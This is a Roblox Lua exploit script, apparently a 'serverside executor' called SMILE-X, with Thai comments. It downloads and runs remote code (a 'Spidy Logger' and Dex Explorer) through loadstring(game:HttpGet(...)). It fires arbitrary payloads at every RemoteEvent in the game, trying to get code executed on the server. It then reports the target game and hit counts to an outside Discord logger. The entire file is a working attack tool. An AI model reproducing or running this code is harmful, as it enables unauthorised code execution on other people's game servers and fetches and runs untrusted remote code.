-- [[ SMILE-X ABSOLUTE EDITION: UNIVERSAL EXECUTOR ]]
-- Created by: Pipe (pipe-2467)
-- Features: Universal Remote Scanner, Spidy Logger, Dex Integrated

local owner = "pipe-2467"
local repo = "SMILE-X-ABSOLUTE-EDITION"
local HttpService = game:GetService("HttpService")
local Market = game:GetService("MarketplaceService")

-- [ 1. ระบบโหลด Spidy Logger จาก GitHub ]
local function LoadLogger()
    local success, result = pcall(function()
        local url = "https://raw.githubusercontent.com/"..owner.."/"..repo.."/main/scripts/spidy_logger.lua"
        return loadstring(game:HttpGet(url))()
    end)
    if success then return result end
    return nil
end

local spidy = LoadLogger()

-- [ 2. ระบบเรียกใช้ Dex Explorer (จากลิงก์ที่นายให้มา) ]
_G.LaunchDex = function()
    local dexUrl = "https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"
    local s, err = pcall(function()
        loadstring(game:HttpGet(dexUrl))()
    end)
    if s then
        if spidy then spidy:SendMessage("✅ Dex Explorer Loaded Successfully!") end
    else
        warn("Dex Load Error: " .. tostring(err))
    end
end

-- [ 3. ฟังก์ชันหลัก: Universal Execute (เจาะทุกท่อในเซิร์ฟเวอร์) ]
function SmileX_Execute(sourceCode)
    local found = 0
    local successCount = 0
    local payload = "loadstring([[" .. sourceCode .. "]])()"
    
    -- สแกนหา RemoteEvent ทั่วทั้งแมพ
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            found = found + 1
            local s, _ = pcall(function()
                -- ทดลองยิงเข้าท่อด้วยวิธีต่างๆ (Standard & Bypass)
                v:FireServer(payload)
                v:FireServer("Execute", payload)
                v:FireServer("RunCommand", payload)
            end)
            if s then successCount = successCount + 1 end
        end
    end
    
    -- รายงานไปที่ Discord
    if spidy then
        spidy:SendReport(
            "Smile-X Execution", 
            "Target: " .. Market:GetProductInfo(game.PlaceId).Name .. 
            "\nFound Remotes: " .. found .. 
            "\nSuccess: " .. successCount, 
            0x00FF80
        )
    end
end

-- [ 4. เริ่มต้นการทำงาน ]
local placeName = Market:GetProductInfo(game.PlaceId).Name
if spidy then
    spidy:SendMessage("🚀 **Smile-X Absolute Injected**\nMap: " .. placeName .. "\nStatus: Identity 8 Active")
end

-- สั่งรัน Dex Explorer ทันที (ถ้าต้องการให้เปิดเองอัตโนมัติ)
-- _G.LaunchDex() 

-- ตั้งค่า Global Function ไว้ให้เรียกใช้จาก UI หรือตัวรันอื่น
_G.SmileX_Run = function(code)
    SmileX_Execute(code)
end

print("SMILE-X: System Ready for " .. placeName)
return SmileX_Execute
